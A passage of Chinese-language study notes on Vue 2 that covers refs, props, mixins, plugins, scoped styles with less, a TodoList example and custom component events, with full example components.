   1. 打标识：`<h1 ref="xxx">.....</h1>` 或`<School ref="xxx"></School>`
   2. 获取：`this.$refs.xxx`

```vue
<template>
  <!-- 网页结构 -->
  <div class="school">
    <!-- ref：用于给节点打标识 -->
    <h1 v-text="msg" ref="title"></h1>
    <button @click="showDOM">点击输出上方DOM元素</button>

    <h2>名称：{{schoolName}}</h2>
    <h2>地址：{{address}}</h2>
  </div>
</template>

<script>
  // js 代码
  // 创建组件的简写形式，省略 Vue.extend(options)
  export default{
    // 给组件起一个名称（可以省略）
    name: 'School',
    data() {
      return {
        schoolName: '月海',
        address: '北京',
        msg: '学习'
      }
    },
    methods: {
      showDOM(){
        // this.$refs.title：获取标识，真实 DOM 元素
        console.log(this.$refs.title);
      }
    },
  }
</script>

<style>
</style>
```

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <!-- 在网页中引入组件 -->
        <!-- ref：用于给节点打标识 -->
        <School ref="sch"/>

        <button @click="showDOM">点击输出上方组件元素</button>
    </div>
</template>

<script>
    // js 引入组件
    import School from "./components/School.vue"

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { School },
        methods: {
            showDOM(){
                // this.$refs.title：获取标识，School 组件的实例对象（vc）
                console.log(this.$refs.sch);
            }
        },
    }
</script>

<style>
    /* css 样式 */
</style>
```
```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
}).$mount('#app')

```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-59-145--dz7K6kRA1PsdfQ.png)

## 6、`props` 属性

1. 功能：让组件接收外部传过来的数据
2. 传递数据：`<Demo name="xxx"/>`
3. 接收数据：
   1. 第一种方式（只接收）：`props:['name']`
   2. 第二种方式（限制类型）：`props:{name:String}`
   3. 第三种方式（限制类型、限制必要性、指定默认值）

```javascript
props:{
  name:{
    type:String, //类型
    required:true, //必要性
    default:'老王' //默认值
  }
}
```

   4. 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。

---

```vue
<template>
    <!-- 网页结构 -->
    <div class="student">
        <h2>姓名：{{name}}</h2>
        <h2>性别：{{sex}}</h2>
        <h2>年龄：{{age}}</h2>
    </div>
</template>

<script>
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default{
        // 给组件起一个名称（可以省略）
        name: 'student',

        // 第一种方式：简单的声明接收
        // props: ['name','sex','age'],

        // 第二种方式：接收的同时对数据进行类型限制
        // props: {
        //     name: String,
        //     sex: Number,
        //     age: String
        // },
        
        // 第三种方式（限制类型、限制必要性、指定默认值）
        props: {
            name: {
                // 类型
                type: String,
                // 是否是必要的参数
                required: true
            },
            sex: {
                type: Number,
                // 默认值
                default: 0
            },
            age: {
                type: Number,
                default: 0
            }
        }
    }
</script>

<style>
</style>
```

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <!-- 在网页中引入组件 -->
        <!-- 
            :age="16" ： v-bind:age="16"；
            age="16" 传递的是字符串，:age="16" 传递的是表达式执行后的值
        -->
        <Student name="月海" :sex="0" :age="16" />
        <!-- 此处限定的 sex、age 的类型是 Number，传递的是字符串，所以会报错 -->
        <Student name="言" sex="0" age="14" />
    </div>
</template>

<script>
    // js 引入组件
    import Student from "./components/Student.vue"

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { Student }
    }
</script>

<style>
    /* css 样式 */
</style>
```

## 7、`mixin` 混入

1. 功能：可以把多个组件共用的配置提取成一个混入对象；
   1. 引入混入对象后，会将本体文件和混入对象中的数据代码进行组合（若是有冲突，则以本体文件为主）
   2. 生命周期钩子不以任何为主，都要
2. 使用方式：
   1. 第一步定义混合：

```vue
{
    data(){....},
    methods:{....}
    ....
}
```

   2. 第二步使用混入：
      1. 全局混入：`Vue.mixin(xxx)`
      2. 局部混入：`mixins:['xxx']`

---

之前：methods 中的 showName 重复

```vue
<template>
    <!-- 网页结构 -->
    <div class="school">
        <h2 @click="showName">学校名称：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>
    </div>
</template>

<script>
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'School',
        data() {
            return {
                name: '月海学校',
                address: '地址'
            }
        },
        methods: {
            showName(){
                alert(this.name)
            }
        }
    }
</script>

<style>
    /* css 样式 */
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="student">
        <h2 @click="showName">姓名：{{name}}</h2>
        <h2>性别：{{sex}}</h2>
        <h2>年龄：{{age}}</h2>
    </div>
</template>

<script>
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Student',
        data() {
            return {
                name: "月海",
                sex: 0,
                age: 16
            }
        },
        methods: {
            showName(){
                alert(this.name)
            }
        }
    }
</script>

<style>
    /* css 样式 */
</style>
```

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <!-- 在网页中引入组件 -->
        <School />

        <hr>

        <Student />
    </div>
</template>

<script>
    // js 引入组件
    import School from "./components/School.vue"
    import Student from "./components/Student.vue"
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { School, Student }
    }
</script>

<style>
    /* css 样式 */
</style>
```

---

之后：提取出来

- 在 src 目录下创建 util 目录，在其中创建 mixin.js 文件

```javascript
// 定义 mixin 函数
export const mixin = {
    methods: {
        showName(){
            alert(this.name)
        }
    }
}
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="school">
        <h2 @click="showName">学校名称：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>
    </div>
</template>

<script>

    // 引入 mixin
    import { mixin } from '@/utils/mixin'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'School',
        data() {
            return {
                name: '月海学校',
                address: '地址'
            }
        },
        // 引入 mixin 混合
        mixins: [ mixin ]
    }
</script>

<style>
    /* css 样式 */
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="student">
        <h2 @click="showName">姓名：{{name}}</h2>
        <h2>性别：{{sex}}</h2>
        <h2>年龄：{{age}}</h2>
    </div>
</template>

<script>
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    import {mixin} from '@/utils/mixin'

    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Student',
        data() {
            return {
                name: "月海",
                sex: 0,
                age: 16
            }
        },
        // 引入 mixin 混合
        mixins: [ mixin ]
    }
</script>

<style>
    /* css 样式 */
</style>
```

## 8、插件

1. 功能：用于增强 Vue （全局）
2. 本质：包含 install 方法的一个对象，install 的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。
3. 定义插件：

```javascript
对象.install = function (Vue, options) {
    // 1. 添加全局过滤器
    Vue.filter(....)

    // 2. 添加全局指令
    Vue.directive(....)

    // 3. 配置全局混入(合)
    Vue.mixin(....)

    // 4. 添加实例方法
    Vue.prototype.$myMethod = function () {...}
    Vue.prototype.$myProperty = xxxx
}
```

4. 使用插件：
   1. 引入插件 `import plugins from './plugins/plugins'`
   2. 使用插件 `Vue.use(plugins)`

---

- 在 src 目录下创建 plugins 目录，在其中创建 plugins.js 文件

```javascript
// 创建插件
export default {
    install(Vue){
        console.log("----install----", Vue)

        // 定义全局指令
        Vue.directive('fbind', {
            // 指令与元素成功绑定时
            bind(element, binding){
                element.value = binding.value;
            },
            // 指令所在元素被插入页面时
            inserted(element){
                element.focus();
            },
            // 指令所在的模板被重新解析时
            update(element, binding){
                element.value = binding.value;
            }
        })

    }
}
```
```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 引入插件
import plugins from './plugins/plugins'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 使用插件
Vue.use(plugins)

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
}).$mount('#app')

```
```vue
<template>
    <!-- 网页结构 -->
    <div class="school">
        <h2>学校名称：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>
    </div>
</template>

<script>
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'School',
        data() {
            return {
                name: '月海学校',
                address: '地址'
            }
        }
    }
</script>

<style>
    /* css 样式 */
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="student">
        <h2>姓名：{{name}}</h2>
        <h2>性别：{{sex}}</h2>
        <h2>年龄：{{age}}</h2>

        <input type="text" v-fbind:value="name">
    </div>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Student',
        data() {
            return {
                name: "月海",
                sex: 0,
                age: 16
            }
        }
    }
</script>

<style>
    /* css 样式 */
</style>
```

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <!-- 在网页中引入组件 -->
        <School />

        <hr>

        <Student />
    </div>
</template>

<script>
    // js 引入组件
    import School from "./components/School.vue"
    import Student from "./components/Student.vue"
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { School, Student }
    }
</script>

<style>
    /* css 样式 */
</style>
```
## 9、`scoped` 样式与 css 预处理器
### ①、scoped

1. 作用：让样式在局部生效，防止冲突。
2. 写法：`<style scoped>`

---

之前：会按照引入顺序，后来者居上

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-59-250--g8B9bDllMccb8Q.png)

```vue
<template>
    <!-- 网页结构 -->
    <div class="demo">
        <h2>姓名：{{name}}</h2>
        <h2>性别：{{sex}}</h2>
        <h2>年龄：{{age}}</h2>

    </div>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Student',
        data() {
            return {
                name: "月海",
                sex: 0,
                age: 16
            }
        }
    }
</script>

<style>
    /* css 样式 */
    .demo{
        background-color: aquamarine;
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="demo">
        <h2>学校名称：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>
    </div>
</template>

<script>
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'School',
        data() {
            return {
                name: '月海学校',
                address: '地址'
            }
        }
    }
</script>

<style>
    /* css 样式 */
    .demo{
        background-color: red;
    }
</style>
```

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <!-- 在网页中引入组件 -->
        <School />

        <hr>

        <Student />
    </div>
</template>

<script>
    // js 引入组件
    import School from "./components/School.vue"
    import Student from "./components/Student.vue"
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { School, Student }
    }
</script>

<style>
    /* css 样式 */
</style>
```

---

使用 `scoped` 属性

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-59-366--WK1encHKriMbsw.png)

```vue
<template>
    <!-- 网页结构 -->
    <div class="demo">
        <h2>姓名：{{name}}</h2>
        <h2>性别：{{sex}}</h2>
        <h2>年龄：{{age}}</h2>

    </div>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Student',
        data() {
            return {
                name: "月海",
                sex: 0,
                age: 16
            }
        }
    }
</script>

<style scoped>
    /* css 样式 */
    .demo{
        background-color: aquamarine;
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="demo">
        <h2>学校名称：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>
    </div>
</template>

<script>
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'School',
        data() {
            return {
                name: '月海学校',
                address: '地址'
            }
        }
    }
</script>

<style scoped>
    /* css 样式 */
    .demo{
        background-color: red;
    }
</style>
```

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <!-- 在网页中引入组件 -->
        <School />

        <hr>

        <Student />
    </div>
</template>

<script>
    // js 引入组件
    import School from "./components/School.vue"
    import Student from "./components/Student.vue"
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { School, Student }
    }
</script>

<style>
    /* css 样式 */
</style>
```

### ②、css 预处理器 `less`

> CSS 预处理器定义了一种新的语言，其基本思想是：用一种专门的编程语言，为CSS增加了一些编程的特性，将CSS作为目标生成文件，然后开发者就只要使用这种语言进行编码工作。
> 
> 通俗的说，CSS预处理器用一种专门的编程语言，进行Web页面样式设计，然后再编译成正常的CSS文件，以供项目使用。CSS预处理器为CSS增加一些编程的特性，无需考虑浏览器的兼容性问题，例如你可以在CSS中使用变量、简单的逻辑程序、函数等等在编程语言中的一些基本特性，可以让你的CSS更加简洁、适应性更强、可读性更佳，更易于代码的维护等诸多好处。
> 
> CSS预处理器技术已经非常成熟，而且也涌现出了很多种不同的CSS预处理器语言，比如说：Sass（SCSS）、LESS、Stylus、Turbine、Swithch CSS、CSS Cacheer、DT CSS等。如此之多的CSS预处理器，那么“我应该选择哪种CSS预处理器？”也相应成了最近网上的一大热门话题，在Linkedin、Twitter、CSS-Trick、知呼以及各大技术论坛上，很多人为此争论不休。相比过计我们对是否应该使用CSS预处理器的话题而言，这已经是很大的进步了。
> 
> 到目前为止，在众多优秀的CSS预处理器语言中就属Sass、LESS和Stylus最优秀，讨论的也多，对比的也多。本文将分别从他们产生的背景、安装、使用语法、异同等几个对比之处向你介绍这三款CSS预处理器语言。相信前端开发工程师会做出自己的选择——我要选择哪款CSS预处理器。
> 
> less 是一款比较流行的预处理 CSS，支持变量、混合、函数、嵌套、循环等特点：[http://lesscss.cn/](http://lesscss.cn/)

1. 安装：`npm i less-loader`，注意 webpack 与 less 的版本
2. 使用：`<style lang="less">`

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-59-470--qI4Kcd0Jg02EEA.png)

```vue
<template>
    <!-- 网页结构 -->
    <div class="demo">
        <h2 class="demoName">学校名称：{{name}}</h2>
        <h2 class="demoAddress">学校地址：{{address}}</h2>
    </div>
</template>

<script>
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'School',
        data() {
            return {
                name: '月海学校',
                address: '地址'
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    .demo{
        background-color: red;

        .demoName{
            background-color: coral;
        }

        .demoAddress{
            background-color: darkorchid;
        }
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="demo">
        <h2>姓名：{{name}}</h2>
        <h2>性别：{{sex}}</h2>
        <h2>年龄：{{age}}</h2>

    </div>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Student',
        data() {
            return {
                name: "月海",
                sex: 0,
                age: 16
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    .demo{
        background-color: aquamarine;
    }
</style>
```

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <!-- 在网页中引入组件 -->
        <School />

        <hr>

        <Student />
    </div>
</template>

<script>
    // js 引入组件
    import School from "./components/School.vue"
    import Student from "./components/Student.vue"
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { School, Student }
    }
</script>

<style>
    /* css 样式 */
</style>
```

## 10、TodoList 案例

1. 组件化编码流程：
   1. 拆分静态组件：组件要按照功能点拆分，命名不要与 html 元素冲突。
   2. 实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：
      1. 一个组件在用：放在组件自身即可
      2. 一些组件在用：放在他们共同的父组件上`<span style="color:red">状态提升</span>`
   3. 实现交互：从绑定事件开始。
2. `props` 适用于：
   1. 父组件 ==> 子组件 通信
   2. 子组件 ==> 父组件 通信（要求父先给子一个函数）
3. 使用 `v-model` 时要切记：`v-model` 绑定的值不能是 `props `传过来的值，因为 `props `是不可以修改的！
4. `props `传过来的若是对象类型的值，修改对象中的属性时 Vue 不会报错，但不推荐这样做。

---

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-59-619--iQdF8d9yYO1hHQ.png)

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
}).$mount('#app')

```
```vue
<template>
    <!-- 在网页中引入组件 -->
    <div class="todo-container">
        <div class="todo-wrap">
            <!-- 传递参数与函数 -->
            <ToDoHeader :todos="todos" :receive="receive" />
            <ToDoList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo" />
            <ToDoFooter :todos="todos" :checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"/>

        </div>
    </div>
</template>

<script>
    // js 引入组件
    import ToDoHeader from "./components/ToDoHeader.vue"
    import ToDoList from "./components/ToDoList.vue"
    import ToDoFooter from "./components/ToDoFooter.vue"
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { ToDoHeader, ToDoList, ToDoFooter },
        data(){
            return {
                // 从本地存储中读取数据，本地存储中没有数据则创建空数组
                todos: JSON.parse(localStorage.getItem("todos")) || []
            }
        },
        methods: {
            // 接收子组件传递过来的对象，添加到数组中
            receive(todo){
                // 将接收的对象放入 todos 数组
                this.todos.push(todo)
            },
            // 接收子组件传递过来的 id，将 done 取反
            checkTodo(id){
                this.todos.forEach((todo)=>{
                    if (todo.id === id){
                        todo.done = !todo.done;
                    }
                })
            },
            // 接收子组件传递过来的 id，删除对应的 todo
            deleteTodo(id){
                this.todos = this.todos.filter((todo)=>{
                    return todo.id !== id;
                })
            },
            // 全选/取消全选
            checkAllTodo(done){
                this.todos.forEach((todo)=>{
                    todo.done = done;
                })
            },
            // 清除已完成任务
            clearAllTodo(){
                this.todos = this.todos.filter((todo)=>{
                    return !todo.done;
                })
            }
        },
        watch: {
            // 当数据改变时，将数据存入本地存储，监视属性的完整形式
            todos: {
                // 开启深度监视
                deep: true,
                handler(value){
                    localStorage.setItem("todos", JSON.stringify(value));
                }
            }
        }
    }
</script>

<style lang="less">
    /* css 样式 */
    body {
        background: #fff;

        .todo-container {
            width: 400px;
            margin: 0 auto;

            .todo-wrap {
                padding: 10px;
                border: 1px solid #ddd;
                border-radius: 5px;
            }

        }
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="todo-header">
        <!-- 调用 add 函数，回车键触发 -->
        <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="add"/>
    </div>
</template>

<script>
// js 代码
export default {
    // 给组件起一个名称（可以省略）
    name: 'ToDoHeader',
    props: [ 'todos', 'receive' ],
    methods: {
        add(value){
            // 获取数组中最后一个元素，取 id，转为整数 + 1，再转为字符串
            let id = String(Number(this.todos[this.todos.length - 1].id) + 1);
            // 加 0
            while (id.length<3){
                id = "0" + id;
            }
            // 创建对像
            let todo = {
                id: id,
                title: value.target.value,
                done: false
            }

            // 调用父组件传递过来的函数，传递对象
            this.receive(todo);

            // 清空输入框
            value.target.value = '';
        }
    }
}
</script>

<style scoped lang="less">
    /* css 样式 */
    /*header*/
    .todo-header {
        input {
            width: 360px;
            height: 28px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 4px;
            padding: 4px 7px;
        }

        .todo-header input:focus {
            outline: none;
            border-color: rgba(82, 168, 236, 0.8);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
        }
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <ul class="todo-main">
        <!-- 循环 -->
        <li v-for="todo in todos" :key=todo.id>
            <label>
                <!--
                    可以将 :checked="todo.done" 和 @change="headerCheck(todo.id) 替换为 :v-model="todo.done"，但是不建议，因为修改了 props
                    @change：改变事件
                -->
                <input type="checkbox" :checked="todo.done" @change="headerCheck(todo.id)"/>
                <span>{{ todo.title }}</span>
            </label>
            <button class="btn btn-danger" @click="headerDelete(todo.id)">删除</button>
        </li>
    </ul>
</template>

<script>
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        name: 'ToDoList',
        props: [ 'todos', 'checkTodo', 'deleteTodo' ],
        methods: {
            // 勾选
            headerCheck(id){
                // 传递 id ，通知 App 组件将对应的 todo 对象的 done 取反
                this.checkTodo(id)
            },
            // 删除
            headerDelete(id){
                // 根据用户选择返回布尔值
                if (confirm('确定要删除吗？')){
                    // 传递 id ，通知 App 组件将对应的 todo 对象删除
                    this.deleteTodo(id);
                }
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    /*main*/
    .todo-main {
        margin-left: 0px;
        border: 1px solid #ddd;
        border-radius: 2px;
        padding: 0px;

        /*item*/
        li {
            list-style: none;
            height: 36px;
            line-height: 36px;
            padding: 0 5px;
            border-bottom: 1px solid #ddd;
        }
        li label {
            float: left;
            cursor: pointer;
        }
        li label li input {
            vertical-align: middle;
            margin-right: 6px;
            position: relative;
            top: -1px;
        }
        li button {
            float: right;
            display: none;
            margin-top: 3px;
        }
        li:before {
            content: initial;
        }
        li:last-child {
            border-bottom: none;
        }
        li:hover{
            background-color: #ddd;
        }
        li:hover button{
            display: block;
        }

        .btn {
            //display: inline-block;
            padding: 4px 12px;
            margin-bottom: 0;
            font-size: 14px;
            line-height: 20px;
            text-align: center;
            vertical-align: middle;
            cursor: pointer;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
            border-radius: 4px;
        }
        .btn-danger {
            color: #fff;
            background-color: #da4f49;
            border: 1px solid #bd362f;
        }
        .btn-danger:hover {
            color: #fff;
            background-color: #bd362f;
        }
        .btn:focus {
            outline: none;
        }
    }

</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="todo-footer" v-show="todos.length">
        <label>
            <input type="checkbox" v-model="isAll"/>
        </label>
        <span>
            <span>已完成{{doneTotal}}</span> / 全部{{todos.length}}
        </span>
        <button class="btn btn-danger" @click="clearAllTodo">清除已完成任务</button>
    </div>
</template>

<script>
// js 代码
export default {
    // 给组件起一个名称（可以省略）
    name: 'ToDoFooter',
    props: [ 'todos', 'checkAllTodo','clearAllTodo' ],
    computed: {
        // 返回已选择数据的数量
        doneTotal(){
            /**
             * reduce() 方法：
             * 参数 1：函数，数组有几个值，就会调用几次
             *      参数 1：pre：当前值；第一次调用该函数的返回值，作为第二次调用该函数的 pre 的值
             *      参数 2：current：本次遍历的元素
             * 参数 2：统计开始的初始值
             */
            return this.todos.reduce((pre, current)=>{
                return pre + ( current.done ? 1 : 0 )
            }, 0)
        },
        // 判断是否全选，弱受上方全选则勾选；否则不勾选
        isAll: {
            // 读取展示
            get(){
                return this.doneTotal === this.todos.length && this.todos.length > 0;
            },
            // 传递是否选择，通知 App 组件将对应的 todo 对象的 done 值修改
            set(value){
                this.checkAllTodo(value)
            }
        }
    }
}
</script>

<style scoped lang="less">
    /* css 样式 */
    /*footer*/
    .todo-footer {
        height: 40px;
        line-height: 40px;
        padding-left: 6px;
        margin-top: 5px;

        label {
            display: inline-block;
            margin-right: 20px;
            cursor: pointer;

            input {
                position: relative;
                top: -1px;
                vertical-align: middle;
                margin-right: 5px;
            }
        }

        button {
            float: right;
            margin-top: 5px;
        }

        .btn {
            display: inline-block;
            padding: 4px 12px;
            margin-bottom: 0;
            font-size: 14px;
            line-height: 20px;
            text-align: center;
            vertical-align: middle;
            cursor: pointer;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
            border-radius: 4px;
        }
        .btn-danger {
            color: #fff;
            background-color: #da4f49;
            border: 1px solid #bd362f;
        }
        .btn-danger:hover {
            color: #fff;
            background-color: #bd362f;
        }
        .btn:focus {
            outline: none;
        }
    }


</style>
```

## 11、组件的自定义事件

1.  一种组件间通信的方式，适用于：**子组件 ===> 父组件** 
2.  使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（事件的回调在A中）。 
3.  绑定自定义事件： 
   1.  第一种方式，在父组件中：`<Demo @atguigu="test"/>`  或 `<Demo v-on:atguigu="test"/>` 
   2.  第二种方式，在父组件中： 

```javascript
<Demo ref="demo"/>
......
mounted(){
   this.$refs.xxx.$on('atguigu',this.test)
}
```

   3.  若想让自定义事件只能触发一次，可以使用`once`修饰符，或`$once`方法。 
4.  触发自定义事件：`this.$emit('atguigu',数据)` 
5.  解绑自定义事件`this.$off('atguigu')` 
6.  组件上也可以绑定原生DOM事件，需要使用`native`修饰符。 
7.  注意：通过`this.$refs.xxx.$on('atguigu',回调)`绑定自定义事件时，回调要么配置在methods中，要么用箭头函数，否则this指向会出问题！ 

---

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
}).$mount('#app')

```

```vue
<template>
    <!-- 网页结构 -->
    <div class="demo">
        <h2>姓名：{{name}}</h2>
        <h2>性别：{{sex}}</h2>
        <h2>年龄：{{age}}</h2>

        <button @click="sendStudentName">把学生名发送给父组件</button><br>
        <button @click="sendStudentSex">把性别发送给父组件</button><br>
        <button @click="unbind">解除姓名绑定</button><br>
        <button @click="unbindMultiple">解除多个绑定</button><br>
        <button @click="unbindAll">解除全部绑定</button>
    </div>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Student',
        data() {
            return {
                name: "月海",
                sex: 0,
                age: 16
            }
        },
        methods: {
            sendStudentName(){
                // 触发在父组件中绑定在 Student 实例身上的 yuehai 事件
                this.$emit("yuehai", this.name);
            },
            sendStudentSex(){
                this.$emit("getSex", this.sex);
            },
            // 解除单个绑定
            unbind(){
                this.$off("yuehai");
            },
            // 解除多个绑定
            unbindMultiple(){
                this.$off(['yuehai', 'getSex']);
            },
            // 解除全部绑定
            unbindAll(){
                this.$off();
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    .demo{
        background-color: aquamarine;
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="demo">
        <h2 class="demoName">学校名称：{{name}}</h2>
        <h2 class="demoAddress">学校地址：{{address}}</h2>

        <button @click="sendSchoolName">把学校名发送给父组件</button>
    </div>
</template>

<script>
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
